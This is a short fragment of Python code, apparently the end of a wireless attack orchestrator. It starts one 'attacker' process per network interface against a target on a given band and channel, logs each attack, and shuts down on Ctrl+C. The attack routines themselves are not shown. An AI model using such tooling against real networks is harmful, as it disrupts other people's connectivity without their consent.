                    p = Process(
                        target=run_attacker_process,
                        args=(iface, target_b, ch, band, attack, counters[iface], shared_channels, args.dry_run),
                        daemon=True
                    )
                    procs[iface] = p
                    p.start()
                    logger.info(f"[ORCHESTRATOR] Interface: {iface} | Band: {band} | Channel: {ch} | Attack: {attack.upper()}")
                    time.sleep(LOG_DELAY_BETWEEN_ATTACKS)
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("[INFO] Ctrl+C detected. Shutting down gracefully...")
    finally:
        cleanup(procs, scanner_proc)
        logger.info("[DONE] Shutdown complete")

if __name__ == "__main__":
    main()
